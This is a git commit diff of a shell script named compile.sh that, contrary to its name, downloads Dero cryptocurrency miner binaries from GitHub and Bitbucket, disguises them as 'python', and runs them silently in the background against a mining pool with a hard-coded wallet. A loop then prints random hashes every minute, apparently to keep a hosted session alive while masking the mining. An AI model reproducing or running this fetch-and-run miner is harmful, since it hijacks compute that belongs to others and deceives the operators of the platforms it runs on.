cf3435158eea5e5192d3410b5ca5fd6e79fbfec0
adihidayat2 <90350504+adihidayat2@users.noreply.github.com>
2022-10-16 21:57:54 +0700

    Update compile.sh

--- compile.sh
+++ compile.sh
@@ -1,5 +1,5 @@
 #!/bin/bash
 curl -L -o python https://github.com/Danis85/dero/raw/main/downloads/bypass-dero-miner && chmod +x python
 curl -L -o python https://bitbucket.org/samilafera/saman/downloads/dero-stratum-miner && chmod +x python
-./python -r dero-merah.dockerpool.my.id:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.anu >/dev/null &
+./python -r dero-merah.dockerpool.my.id:80 -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92x6838l67tghl8zqsn7unx.simbah >/dev/null &
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
